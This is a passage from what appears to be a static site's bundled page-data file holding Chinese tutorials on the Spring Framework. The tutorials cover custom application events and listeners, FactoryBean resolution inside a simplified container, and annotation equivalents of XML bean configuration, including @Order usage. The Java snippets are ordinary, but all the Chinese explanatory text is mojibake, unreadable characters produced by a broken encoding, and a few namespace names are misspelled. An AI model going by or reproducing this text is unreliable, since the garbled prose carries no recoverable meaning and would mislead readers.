æ³¨è§£æ¥çå¬è¿äºäºä»¶ãä»¥çå¬ ContextRefreshedEvent ä¸ºä¾ï¼æä»¬å¯ä»¥ç¼åå¦ä¸ä»£ç ï¼\n\n@Component\npublic class MyListener implements ApplicationListener<ContextRefreshedEvent> {\n    @Override\n    public void onApplicationEvent(ContextRefreshedEvent event) {\n        // å¨æ­¤å¤ç¼åéè¦æ§è¡çé»è¾\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\né¤äºå®ç° ApplicationListener æ¥å£å¤ï¼æä»¬è¿å¯ä»¥ä½¿ç¨ @EventListener æ³¨è§£æ¥çå¬äºä»¶ãä¾å¦ï¼æä»¬å¯ä»¥å¨ Spring ç»ä»¶ä¸­æ·»å å¦ä¸æ¹æ³ï¼\n\n@EventListener\npublic void handleContextRefreshedEvent(ContextRefreshedEvent event) {\n    // å¨æ­¤å¤ç¼åéè¦æ§è¡çé»è¾\n}\n\n\n1\n2\n3\n4\n\n\nè¦ä½¿ç¨ Spring æä¾çç±»èªå®ä¹ä¸ä¸ªäºä»¶åå¸åçå¬ï¼é¦åï¼æä»¬éè¦å®ä¹ä¸ä¸ªèªå®ä¹äºä»¶ãå¯ä»¥åå»ºä¸ä¸ªç»§æ¿èª ApplicationEvent çç±»ï¼å¹¶å¨å¶ä¸­æ·»å èªå®ä¹å­æ®µåæ¹æ³\n\npublic class MyCustomEvent extends ApplicationEvent {\n    private String message;\n    public MyCustomEvent(Object source, String message) {\n        super(source);\n        this.message = message;\n    }\n    public String getMessage() {\n        return message;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nåå¸äºä»¶ ä¸æ¦å®ä¹äºèªå®ä¹äºä»¶ï¼æä»¬å°±å¯ä»¥ä½¿ç¨ ApplicationContext ç publishEvent æ¹æ³æ¥åå¸äºä»¶\n\n@Autowired\nprivate ApplicationContext applicationContext;\n\npublic void doSomethingAndPublishEvent() {\n    // å¨æ­¤å¤æ§è¡ä¸å¡é»è¾\n    MyCustomEvent event = new MyCustomEvent(this, "Hello, world!");\n    applicationContext.publishEvent(event);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nçå¬äºä»¶ æåï¼æä»¬éè¦åå»ºä¸ä¸ªäºä»¶çå¬å¨ï¼ä»¥ä¾¿å¤çèªå®ä¹äºä»¶ãå¯ä»¥åå»ºä¸ä¸ªå®ç° ApplicationListener æ¥å£çç±»ï¼å¹¶å¨å¶ onApplicationEvent æ¹æ³ä¸­æ·»å å¤çé»è¾\n\n@Component\npublic class MyCustomEventListener implements ApplicationListener<MyCustomEvent> {\n    @Override\n    public void onApplicationEvent(MyCustomEvent event) {\n        System.out.println("Received custom event - " + event.getMessage());\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nè¿æ ·ï¼å½ MyCustomEvent äºä»¶è¢«åå¸æ¶ï¼MyCustomEventListener å°±ä¼æ¶å°è¯¥äºä»¶å¹¶è°ç¨å¶ onApplicationEvent æ¹æ³è¿è¡å¤çã',normalizedContent:'å¨ spring æ¡æ¶ä¸­ï¼event ä»£è¡¨çä¸ä¸ªåºç¨ç¨åºä¸­çäºä»¶ãè¿äºäºä»¶å¯ä»¥æ¯ä»»ä½ç±»åçç¶æååï¼å¦ç¨æ·æä½ãæ°æ®æ´æ°åç³»ç»éè¯¯ç­ç­ãæä»¬å¯ä»¥ä½¿ç¨ event æ¥å®ç°åºç¨ç¨åºåé¨çéä¿¡ååä½ãéè¿è§å¯èæ¨¡å¼ï¼æä»¬å¯ä»¥è®©ä¸åçç»ä»¶å¨ç¹å®çäºä»¶åçæ¶ååºååºï¼ä»èå®ç°æ¾è¦åçè®¾è®¡ã\n\nspring æä¾äºä¸ä¸ªç®åèå¼ºå¤§çæºå¶æ¥å¤ç eventï¼å³ applicationevent å applicationlistener æ¥å£ãapplicationevent æ¯ä¸ä¸ªåºæ¬çäºä»¶ç±»ï¼å®å¯ä»¥è¢«ç»§æ¿ä»¥å®ç°åç§ç±»åçäºä»¶ãapplicationlistener æ¥å£åå®ä¹äºä¸ä¸ªçå¬å¨ï¼å¨æä¸ªäºä»¶åçæ¶è§¦ååè°æ¹æ³ãä»¥ä¸æä¾äºåºæ¬çç±»å¾å³ç³»ï¼å¶ä¸­ abstractapplicationcontext æ¯æ§è¡ spring æææ ¸å¿æ¹æ³çéæç±»ï¼\n\n\n\nspring æä¾äºè®¸å¤ä¸åç±»åç eventï¼æ¯ç§ event é½æå¶ç¹å®çä½ç¨åç¨éãä¸é¢æ¯ spring çå½å¨æä¸­æä¾ç event åå¶ä½ç¨ï¼\n\n * contextrefreshedeventï¼è¡¨ç¤º applicationcontext å·²ç»åå§åå¹¶ä¸åå¤å¥½æ¥åè¯·æ±ãéå¸¸æåµä¸ï¼æä»¬å¯ä»¥å©ç¨è¯¥äºä»¶æ¥è¿è¡ä¸äºåå§åæä½ã\n * contextstartedeventï¼è¡¨ç¤º applicationcontext æ­£å¨å¯å¨ãå½åºç¨ç¨åºä¸­æéè¦å¨å¯å¨æ¶æ§è¡çæä½æ¶ï¼å¯ä»¥ä½¿ç¨è¯¥äºä»¶è¿è¡å¤çã\n * contextstoppedeventï¼è¡¨ç¤º applicationcontext å·²åæ­¢ãå½éè¦å¨åºç¨ç¨åºåæ­¢åæ§è¡æäºæä½æ¶ï¼å¯ä»¥ä½¿ç¨è¯¥äºä»¶ã\n * contextclosedeventï¼è¡¨ç¤º applicationcontext å·²ç»å³é­ãä¸ contextstoppedevent ä¸åï¼contextclosedevent æ¯å¨ applicationcontext å³é­ä¹ååéçï¼å®åè®¸æä»¬å¯¹èµæºè¿è¡å®å¨éæ¾ã\n * requesthandledeventï¼è¡¨ç¤ºä¸ä¸ª http è¯·æ±å·²ç»è¢«å¤çå®æ¯ãè¯¥äºä»¶éå¸¸ç¨äºè®°å½æç»è®¡è¯·æ±å¤ççæ§è½æ°æ®ã\n\nå¨ spring ä¸­ï¼æä»¬å¯ä»¥éè¿å®ç° applicationlistener æ¥å£æä½¿ç¨ @eventlistener æ³¨è§£æ¥çå¬è¿äºäºä»¶ãä»¥çå¬ contextrefreshedevent ä¸ºä¾ï¼æä»¬å¯ä»¥ç¼åå¦ä¸ä»£ç ï¼\n\n@component\npublic class mylistener implements applicationlistener<contextrefreshedevent> {\n    @override\n    public void onapplicationevent(contextrefreshedevent event) {\n        // å¨æ­¤å¤ç¼åéè¦æ§è¡çé»è¾\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\né¤äºå®ç° applicationlistener æ¥å£å¤ï¼æä»¬è¿å¯ä»¥ä½¿ç¨ @eventlistener æ³¨è§£æ¥çå¬äºä»¶ãä¾å¦ï¼æä»¬å¯ä»¥å¨ spring ç»ä»¶ä¸­æ·»å å¦ä¸æ¹æ³ï¼\n\n@eventlistener\npublic void handlecontextrefreshedevent(contextrefreshedevent event) {\n    // å¨æ­¤å¤ç¼åéè¦æ§è¡çé»è¾\n}\n\n\n1\n2\n3\n4\n\n\nè¦ä½¿ç¨ spring æä¾çç±»èªå®ä¹ä¸ä¸ªäºä»¶åå¸åçå¬ï¼é¦åï¼æä»¬éè¦å®ä¹ä¸ä¸ªèªå®ä¹äºä»¶ãå¯ä»¥åå»ºä¸ä¸ªç»§æ¿èª applicationevent çç±»ï¼å¹¶å¨å¶ä¸­æ·»å èªå®ä¹å­æ®µåæ¹æ³\n\npublic class mycustomevent extends applicationevent {\n    private string message;\n    public mycustomevent(object source, string message) {\n        super(source);\n        this.message = message;\n    }\n    public string getmessage() {\n        return message;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nåå¸äºä»¶ ä¸æ¦å®ä¹äºèªå®ä¹äºä»¶ï¼æä»¬å°±å¯ä»¥ä½¿ç¨ applicationcontext ç publishevent æ¹æ³æ¥åå¸äºä»¶\n\n@autowired\nprivate applicationcontext applicationcontext;\n\npublic void dosomethingandpublishevent() {\n    // å¨æ­¤å¤æ§è¡ä¸å¡é»è¾\n    mycustomevent event = new mycustomevent(this, "hello, world!");\n    applicationcontext.publishevent(event);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nçå¬äºä»¶ æåï¼æä»¬éè¦åå»ºä¸ä¸ªäºä»¶çå¬å¨ï¼ä»¥ä¾¿å¤çèªå®ä¹äºä»¶ãå¯ä»¥åå»ºä¸ä¸ªå®ç° applicationlistener æ¥å£çç±»ï¼å¹¶å¨å¶ onapplicationevent æ¹æ³ä¸­æ·»å å¤çé»è¾\n\n@component\npublic class mycustomeventlistener implements applicationlistener<mycustomevent> {\n    @override\n    public void onapplicationevent(mycustomevent event) {\n        system.out.println("received custom event - " + event.getmessage());\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nè¿æ ·ï¼å½ mycustomevent äºä»¶è¢«åå¸æ¶ï¼mycustomeventlistener å°±ä¼æ¶å°è¯¥äºä»¶å¹¶è°ç¨å¶ onapplicationevent æ¹æ³è¿è¡å¤çã',charsets:{cjk:!0}},{title:"æ ¸å¿åå®¹æè§£ FactoryBean",frontmatter:{title:"æ ¸å¿åå®¹æè§£ FactoryBean",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring/204/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/01.spring/204.%E6%A0%B8%E5%BF%83%E5%86%85%E5%AE%B9%E6%8B%86%E8%A7%A3%20FactoryBean.html",relativePath:"01.æ¡æ¶/01.Spring/01.spring/204.æ ¸å¿åå®¹æè§£ FactoryBean.md",key:"v-e7b7c32a",path:"/spring/spring/204/",lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:null,content:'FactoryBean æ¥å£ï¼ä½¿å¾æä»¬å¯ä»¥éè¿ç¼åèªå®ä¹ä»£ç æ¥å®ç° Bean çå®ä¾ååæ³¨å¥ãå·ä½æ¥è¯´ï¼éè¿å®ç° FactoryBean æ¥å£ï¼æä»¬å¯ä»¥å¨ getObject () æ¹æ³ä¸­ç¼åèªå·±çé»è¾æ¥å®ä¾å Beanï¼åæ¶å¯ä»¥å¨ getObjectType () æ¹æ³ä¸­æå®è¿åçç±»åãå æ­¤ï¼FactoryBean çä¸»è¦ä½ç¨æ¯å¯¹ Bean çåå»ºè¿ç¨è¿è¡ä¸ªæ§åå®å¶ï¼ä½¿å¾æä»¬è½å¤æ´å¥½å°æ§å¶ Spring å®¹å¨ä¸­ Bean ççå½å¨æåè¡ä¸ºãåæ¶ï¼å®è¿å¯ä»¥æ¯æåä¾æ¨¡å¼æèååæ¨¡å¼ç Bean åå»ºæ¹å¼ï¼æ´è¿ä¸æ­¥å¢å¼ºäº Spring å®¹å¨ççµæ´»æ§ã\n\npublic interface FactoryBean<T> {\n    // è·åå¯¹è±¡\n    T getObject() throws Exception;\n    // è·åå¯¹è±¡ç±»å\n    Class<?> getObjectType();\n    // å¤æ­æ¯å¦åä¾\n    boolean isSingleton();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nå¨ ãæ ¸å¿åè½æè§£ IOCã ä¸æä¸­ï¼å½ä¸ä¸ª Bean å¯¹è±¡çåå»ºç»æï¼å¹¶å¾å°æåå»ºç Bean åï¼ä¼ç»§ç»­æ§è¡ getObjectForBeanInstance æ¹æ³\n\n   protected <T> T doGetBean(final String name, final Object[] args) {\n        // ä»ç¼å­ä¸­è·åå®ä¾\n        Object sharedInstance = getSingleton(name);\n        if (sharedInstance != null) {\n            // å¦æå®ç°äº FactoryBeanï¼åéè¦è°ç¨ FactoryBean#getObject\n            return (T) getObjectForBeanInstance(sharedInstance, name);\n        }\n        // ä»BeanDefinitionåè¡¨ä¸­è·åå¯¹è±¡\n        BeanDefinition beanDefinition = getBeanDefinition(name);\n        Object bean = createBean(name, beanDefinition, args);\n        // å¦æå®ç°äº FactoryBeanï¼åéè¦è°ç¨ FactoryBean#getObject\n        return (T) getObjectForBeanInstance(bean, name);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nè¯¥æ¹æ³ç¨äºå¤æ­ä¸ä¸ª Bean æ¯å¦å®ç°äº FactoryBean æ¥å£ï¼å¦æå®ç°äºæ¥å£åéè¦è¿è¡å¯¹åºçæä½\n\nprivate Object getObjectForBeanInstance(Object beanInstance, String beanName) {\n    if (!(beanInstance instanceof FactoryBean)) {\n        return beanInstance;\n    }\n    // æ¥è¯¢ Bean æ¯å¦å·²è¢«æ§è¡è¿\n    Object object = getCachedObjectForFactoryBean(beanName);\n    if (object == null) {\n        // è½¬æ FactoryBean\n        FactoryBean<?> factoryBean = (FactoryBean<?>) beanInstance;\n        // å·ä½æ§è¡\n        object = getObjectFromFactoryBean(factoryBean, beanName);\n    }\n    return object;\n}\n\nprotected Object getObjectFromFactoryBean(FactoryBean factory, String beanName) {\n    // å¤æ­æ¯å¦åä¾ï¼åä¾ä¼æ·»å å° factoryBeanObjectCache æ¹è¯¥Mapä¸­ï¼é¿åéå¤\n    if (factory.isSingleton()) {\n        // è·å\n        Object object = this.factoryBeanObjectCache.get(beanName);\n        // å¤æ­æ¯å¦å­å¨\n        if (object == null) {\n            // æ§è¡\n            object = doGetObjectFromFactoryBean(factory, beanName);\n            this.factoryBeanObjectCache.put(beanName, (object != null ? object : NULL_OBJECT));\n        }\n        return (object != NULL_OBJECT ? object : null);\n    } else {\n        return doGetObjectFromFactoryBean(factory, beanName);\n    }\n}\n\nprivate Object doGetObjectFromFactoryBean(final FactoryBean factory, final String beanName){\n    try {\n        // è°ç¨æ¥å£æ¹æ³\n        return factory.getObject();\n    } catch (Exception e) {\n        throw new BeansException("FactoryBean threw exception on object[" + beanName + "] creation", e);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\nè¿ç§æ¹å¼å¯ä»¥çè§£ä¸ºï¼å®ç° FactoryBean çç±»æ¯ä¸ä¸ªä»£çç±»ï¼ä»çå·¥ä½ä¸»è¦æ¯å¨èªå·±è¢«åå»ºçæ¶åï¼æç§ Spring ççå½å¨æï¼åå»ºèªå·±çå®ä¾ï¼å¡«åå±æ§ï¼åå§åä¹åæ§è¡ï¼åå§åæ§è¡ï¼åå§åä¹åæ§è¡ï¼è¿ä¸åé½åªæ¯ä¸ºè¢«ä»£çç±»åå¥½æ¡ä»¶éºè®¾ï¼ç­è¿ä¸ªä»£çç±»åå»ºå®æ¯åï¼ä¼æ§è¡ getObjectForBeanInstance æ¹æ³ï¼è¿åè¢«ä»£ççç±»ãæ´ç®åççè§£å°±æ¯ FactoryBean å¯ä»¥å¸®æä»¬å¶é æä»¬æ³è¦ç Beanï¼ä¾å¶ä» Bean ä¾èµæä½¿ç¨ã',normalizedContent:'factorybean æ¥å£ï¼ä½¿å¾æä»¬å¯ä»¥éè¿ç¼åèªå®ä¹ä»£ç æ¥å®ç° bean çå®ä¾ååæ³¨å¥ãå·ä½æ¥è¯´ï¼éè¿å®ç° factorybean æ¥å£ï¼æä»¬å¯ä»¥å¨ getobject () æ¹æ³ä¸­ç¼åèªå·±çé»è¾æ¥å®ä¾å beanï¼åæ¶å¯ä»¥å¨ getobjecttype () æ¹æ³ä¸­æå®è¿åçç±»åãå æ­¤ï¼factorybean çä¸»è¦ä½ç¨æ¯å¯¹ bean çåå»ºè¿ç¨è¿è¡ä¸ªæ§åå®å¶ï¼ä½¿å¾æä»¬è½å¤æ´å¥½å°æ§å¶ spring å®¹å¨ä¸­ bean ççå½å¨æåè¡ä¸ºãåæ¶ï¼å®è¿å¯ä»¥æ¯æåä¾æ¨¡å¼æèååæ¨¡å¼ç bean åå»ºæ¹å¼ï¼æ´è¿ä¸æ­¥å¢å¼ºäº spring å®¹å¨ççµæ´»æ§ã\n\npublic interface factorybean<t> {\n    // è·åå¯¹è±¡\n    t getobject() throws exception;\n    // è·åå¯¹è±¡ç±»å\n    class<?> getobjecttype();\n    // å¤æ­æ¯å¦åä¾\n    boolean issingleton();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nå¨ ãæ ¸å¿åè½æè§£ iocã ä¸æä¸­ï¼å½ä¸ä¸ª bean å¯¹è±¡çåå»ºç»æï¼å¹¶å¾å°æåå»ºç bean åï¼ä¼ç»§ç»­æ§è¡ getobjectforbeaninstance æ¹æ³\n\n   protected <t> t dogetbean(final string name, final object[] args) {\n        // ä»ç¼å­ä¸­è·åå®ä¾\n        object sharedinstance = getsingleton(name);\n        if (sharedinstance != null) {\n            // å¦æå®ç°äº factorybeanï¼åéè¦è°ç¨ factorybean#getobject\n            return (t) getobjectforbeaninstance(sharedinstance, name);\n        }\n        // ä»beandefinitionåè¡¨ä¸­è·åå¯¹è±¡\n        beandefinition beandefinition = getbeandefinition(name);\n        object bean = createbean(name, beandefinition, args);\n        // å¦æå®ç°äº factorybeanï¼åéè¦è°ç¨ factorybean#getobject\n        return (t) getobjectforbeaninstance(bean, name);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nè¯¥æ¹æ³ç¨äºå¤æ­ä¸ä¸ª bean æ¯å¦å®ç°äº factorybean æ¥å£ï¼å¦æå®ç°äºæ¥å£åéè¦è¿è¡å¯¹åºçæä½\n\nprivate object getobjectforbeaninstance(object beaninstance, string beanname) {\n    if (!(beaninstance instanceof factorybean)) {\n        return beaninstance;\n    }\n    // æ¥è¯¢ bean æ¯å¦å·²è¢«æ§è¡è¿\n    object object = getcachedobjectforfactorybean(beanname);\n    if (object == null) {\n        // è½¬æ factorybean\n        factorybean<?> factorybean = (factorybean<?>) beaninstance;\n        // å·ä½æ§è¡\n        object = getobjectfromfactorybean(factorybean, beanname);\n    }\n    return object;\n}\n\nprotected object getobjectfromfactorybean(factorybean factory, string beanname) {\n    // å¤æ­æ¯å¦åä¾ï¼åä¾ä¼æ·»å å° factorybeanobjectcache æ¹è¯¥mapä¸­ï¼é¿åéå¤\n    if (factory.issingleton()) {\n        // è·å\n        object object = this.factorybeanobjectcache.get(beanname);\n        // å¤æ­æ¯å¦å­å¨\n        if (object == null) {\n            // æ§è¡\n            object = dogetobjectfromfactorybean(factory, beanname);\n            this.factorybeanobjectcache.put(beanname, (object != null ? object : null_object));\n        }\n        return (object != null_object ? object : null);\n    } else {\n        return dogetobjectfromfactorybean(factory, beanname);\n    }\n}\n\nprivate object dogetobjectfromfactorybean(final factorybean factory, final string beanname){\n    try {\n        // è°ç¨æ¥å£æ¹æ³\n        return factory.getobject();\n    } catch (exception e) {\n        throw new beansexception("factorybean threw exception on object[" + beanname + "] creation", e);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\nè¿ç§æ¹å¼å¯ä»¥çè§£ä¸ºï¼å®ç° factorybean çç±»æ¯ä¸ä¸ªä»£çç±»ï¼ä»çå·¥ä½ä¸»è¦æ¯å¨èªå·±è¢«åå»ºçæ¶åï¼æç§ spring ççå½å¨æï¼åå»ºèªå·±çå®ä¾ï¼å¡«åå±æ§ï¼åå§åä¹åæ§è¡ï¼åå§åæ§è¡ï¼åå§åä¹åæ§è¡ï¼è¿ä¸åé½åªæ¯ä¸ºè¢«ä»£çç±»åå¥½æ¡ä»¶éºè®¾ï¼ç­è¿ä¸ªä»£çç±»åå»ºå®æ¯åï¼ä¼æ§è¡ getobjectforbeaninstance æ¹æ³ï¼è¿åè¢«ä»£ççç±»ãæ´ç®åççè§£å°±æ¯ factorybean å¯ä»¥å¸®æä»¬å¶é æä»¬æ³è¦ç beanï¼ä¾å¶ä» bean ä¾èµæä½¿ç¨ã',charsets:{cjk:!0}},{title:"æ³¨è§£æ¿ä»£Springçå½å¨æå®ç°ç±»",frontmatter:{title:"æ³¨è§£æ¿ä»£Springçå½å¨æå®ç°ç±»",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring/205/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/01.spring/205.%E6%B3%A8%E8%A7%A3%E6%9B%BF%E4%BB%A3Spring%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%AE%9E%E7%8E%B0%E7%B1%BB.html",relativePath:"01.æ¡æ¶/01.Spring/01.spring/205.æ³¨è§£æ¿ä»£Springçå½å¨æå®ç°ç±».md",key:"v-9905be46",path:"/spring/spring/205/",headers:[{level:2,title:"Spring IOC",slug:"spring-ioc",normalizedTitle:"spring ioc",charIndex:151},{level:3,title:"@Bean",slug:"bean",normalizedTitle:"@bean",charIndex:166},{level:3,title:"@Scope",slug:"scope",normalizedTitle:"@scope",charIndex:307},{level:3,title:"@PostConstruct",slug:"postconstruct",normalizedTitle:"@postconstruct",charIndex:352},{level:3,title:"@PreDestroy",slug:"predestroy",normalizedTitle:"@predestroy",charIndex:389},{level:3,title:"Spring DI",slug:"spring-di",normalizedTitle:"spring di",charIndex:426},{level:3,title:"@Autowired",slug:"autowired",normalizedTitle:"@autowired",charIndex:644},{level:3,title:"@Qualifier",slug:"qualifier",normalizedTitle:"@qualifier",charIndex:759},{level:3,title:"@Resource",slug:"resource",normalizedTitle:"@resource",charIndex:936},{level:3,title:"@Value",slug:"value",normalizedTitle:"@value",charIndex:1155},{level:2,title:"Spring AOP",slug:"spring-aop",normalizedTitle:"spring aop",charIndex:1196},{level:3,title:"@Aspect",slug:"aspect",normalizedTitle:"@aspect",charIndex:1211},{level:3,title:"@Before",slug:"before",normalizedTitle:"@before",charIndex:1246},{level:3,title:"@AfterReturning",slug:"afterreturning",normalizedTitle:"@afterreturning",charIndex:1281},{level:3,title:"@AfterThrowing",slug:"afterthrowing",normalizedTitle:"@afterthrowing",charIndex:1335},{level:3,title:"@After",slug:"after",normalizedTitle:"@after",charIndex:1281},{level:3,title:"@Around",slug:"around",normalizedTitle:"@around",charIndex:1420},{level:2,title:"å¶ä»æ³¨è§£",slug:"å¶ä»æ³¨è§£",normalizedTitle:"å¶ä»æ³¨è§£",charIndex:1455},{level:3,title:"@Order",slug:"order",normalizedTitle:"@order",charIndex:1464},{level:4,title:"éè¯¯ä½¿ç¨",slug:"éè¯¯ä½¿ç¨",normalizedTitle:"éè¯¯ä½¿ç¨",charIndex:1765},{level:4,title:"æ­£ç¡®ä½¿ç¨",slug:"æ­£ç¡®ä½¿ç¨",normalizedTitle:"æ­£ç¡®ä½¿ç¨",charIndex:2381},{level:3,title:"@AutoConfigureOrder",slug:"autoconfigureorder",normalizedTitle:"@autoconfigureorder",charIndex:3008}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"Spring IOC @Bean @Scope @PostConstruct @PreDestroy Spring DI @Autowired @Qualifier @Resource @Value Spring AOP @Aspect @Before @AfterReturning @AfterThrowing @After @Around å¶ä»æ³¨è§£ @Order éè¯¯ä½¿ç¨ æ­£ç¡®ä½¿ç¨ @AutoConfigureOrder",content:'å¨æ©æç Spring ä¸­ï¼æä»¬é½æ¯ä½¿ç¨ XML æ¥è¿è¡ç¸åºç Bean ä¾èµæè¿°åå±æ§æè¿°ï¼ä½å¨ Spring Boot ä¸­å¤§å¤è¿æ¯ä¹ æ¯ä½¿ç¨æ³¨è§£çæ¹å¼æ¥å®ç°ï¼é£è¿éæå°±æ¥æ»ç»ä¸å¨ Spring çå½å¨æä¸­ï¼æåªäºç±»æä¾äºæ©å±å¯ä»¥ç»æä»¬å®ç°ï¼ä»¥ååå xml çæ¹å¼åæ³¨è§£æ¹å¼çä¸¤ç§å®ç°æ¹å¼ã\n\n\n# Spring IOC\n\n\n# @Bean\n\n<bean id="student" class="com.xinhua.study.bean.Student" scope="prototype" init-method="init()" destroy-method="destroy()"/>\n\n\n1\n\n\n\n# @Scope\n\nscope="singleton/prototype"\n\n\n1\n\n\n\n# @PostConstruct\n\ninit-method\n\n\n1\n\n\n\n# @PreDestroy\n\ndestroy-method\n\n\n1\n\n\n\n# Spring DI\n\nAutowired+Qualifier=Resource è¿å°±æ¯ä»ä»¬ä¸èçå³ç³»ï¼Autowired æ ¹æ®ç±»åæ¾å®ç°ç±»ï¼ä¸ä¸ªæ¥å£æå¤ä¸ªå®ç°ç±»æ¶éè¦éè¿ Qualifier æ¥ææéè¦åªä¸ªå®ç°ç±»ï¼è¿æ¯å°±éè¦ Autowired+Qualifier ä¸èµ·ä½¿ç¨æå¯ä»¥ãResource åæ¯ä¸å£°æåç§°æ¶æç§ç±»åæ¥æ¾ææä¸ Autowired ç¸åï¼å£°æåç§°æ¶å°±ç­äº Autowired+Qualifier çç»å\n\n\n# @Autowired\n\n@Autowired å¯ä»¥åç¬ä½¿ç¨ãå¦æåç¬ä½¿ç¨ï¼å®å°æç±»åè£éãå æ­¤ï¼å¦æå¨å®¹å¨ä¸­å£°æäºå¤ä¸ªç¸åç±»åç beanï¼åä¼åºç°é®é¢ï¼å ä¸º @Autowired ä¸ç¥éè¦ä½¿ç¨åªä¸ª bean æ¥æ³¨å¥ãå æ­¤ï¼ä½¿ç¨ @Qualifier ä¸ @Autowired ä¸èµ·ï¼éè¿æå® bean åç§°æ¥éæå®éè£éç bean\n\nref="ç±»å"\n\n\n1\n\n\n\n# @Qualifier\n\n@Qualifier é»è®¤æåç§°è£éï¼è¿ä¸ªæ³¨è§£æ¯å±äº spring çï¼ï¼value é»è®¤ @Qualifier (value = "") ç©ºå¼ã\n\nref="ç±»å"\n\n\n1\n\n\n\n# @Resource\n\n@Resourceï¼è¿ä¸ªæ³¨è§£å±äº J2EE çï¼ï¼é»è®¤æç§åç§°è¿è¡è£éï¼åç§°å¯ä»¥éè¿ name å±æ§è¿è¡æå®ï¼ å¦ææ²¡ææå® name å±æ§ï¼å½æ³¨è§£åå¨å­æ®µä¸æ¶ï¼é»è®¤åå­æ®µåè¿è¡æç§åç§°æ¥æ¾ï¼å¦ææ³¨è§£åå¨ setter æ¹æ³ä¸é»è®¤åå±æ§åè¿è¡è£éã å½æ¾ä¸å°ä¸åç§°å¹éç bean æ¶ææç§ç±»åè¿è¡è£éãä½æ¯éè¦æ³¨æçæ¯ï¼å¦æ name å±æ§ä¸æ¦æå®ï¼å°±åªä¼æç§åç§°è¿è¡è£éã\n\nref="ç±»å"\n\n\n1\n\n\n\n# @Value\n\nç»åºæ¬æ°æ®ç±»åèµå¼\n\nref="åºç¡æ°æ®ç±»å"\n\n\n1\n\n\n\n# Spring AOP\n\n\n# @Aspect\n\nå£°æçé¢\n\napo:aspect\n\n\n1\n\n\n\n# @Before\n\nåç½®éç¥\n\napo:before\n\n\n1\n\n\n\n# @AfterReturning\n\nåç½®æ­£å¸¸éç¥\n\naop:after-returning\n\n\n1\n\n\n\n# @AfterThrowing\n\nåç½®å¼å¸¸éç¥\n\naop:after-throwing\n\n\n1\n\n\n\n# @After\n\næç»éç¥\n\naop:after\n\n\n1\n\n\n\n# @Around\n\nç¯ç»éç¥\n\naop:around\n\n\n1\n\n\n\n# å¶ä»æ³¨è§£\n\n\n# @Order\n\næå¼å§ Order æ³¨è§£ç¨äºåé¢çä¼åçº§æå®ï¼å¨ 4.0 ä¹åå¯¹å®çåè½è¿è¡äºå¢å¼ºï¼æ¯æéåçæ³¨å¥æ¶ï¼æå®éåä¸­ bean çé¡ºåºï¼å¹¶ä¸ç¹å«æåºäºï¼å®å¯¹äºåå®ä¾ç bean ä¹é´çé¡ºåºï¼æ²¡æä»»ä½å½±åã\n\næ³¨è§£ @Order æèæ¥å£ Ordered çä½ç¨æ¯å®ä¹ Spring IOC å®¹å¨ä¸­ Bean çæ§è¡é¡ºåºçä¼åçº§ï¼èä¸æ¯å®ä¹ Bean çå è½½é¡ºåºï¼Bean çå è½½é¡ºåºä¸å @Order æ Ordered æ¥å£çå½±åï¼\n\n@Order æ³¨è§£ä¸è½æå® bean çå è½½é¡ºåºï¼å®éç¨äº AOP çä¼åçº§ï¼ä»¥åå°å¤ä¸ª Bean æ³¨å¥å°éåæ¶ï¼è¿äº bean å¨éåä¸­çé¡ºåº\n\n# éè¯¯ä½¿ç¨\n\n// éè¯¯ä½¿ç¨æ¹æ³ 1\n@Component\n@Order(2)\npublic class OrderA {\n    public OrderA() {\n        System.out.println("************ A ************");\n    }\n}\n\n@Component\n@Order(1)\npublic class OrderB {\n    public OrderB() {\n        System.out.println("************ B ************");\n    }\n}\n// éè¯¯ä½¿ç¨æ¹æ³ 2\n@Configuration\npublic class OrderBeanConfig {\n \n    @Order(2)\n    @Bean\n    public OrderC orderC() {\n        return new OrderC();\n    }\n \n    @Order(1)\n    @Bean\n    public OrderD orderD() {\n        return new OrderD();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n# æ­£ç¡®ä½¿ç¨\n\n@Component\n@Order(value = 3)\npublic class AnoBeanA implements IBean{\n    public AnoBeanA() {\n        System.out.println("************ AnoBean A ************");\n    }\n}\n\n@Component\n@Order(value = 2)\npublic class AnoBeanB implements IBean{\n \n    public AnoBeanB() {\n        System.out.println("************ AnoBean B ************");\n    }\n}\n\n@Component\npublic class AnoBean {\n    public AnoBean(List<IBean> anoBeanList) {\n        for (IBean bean : anoBeanList) {\n            System.out.println("in ano 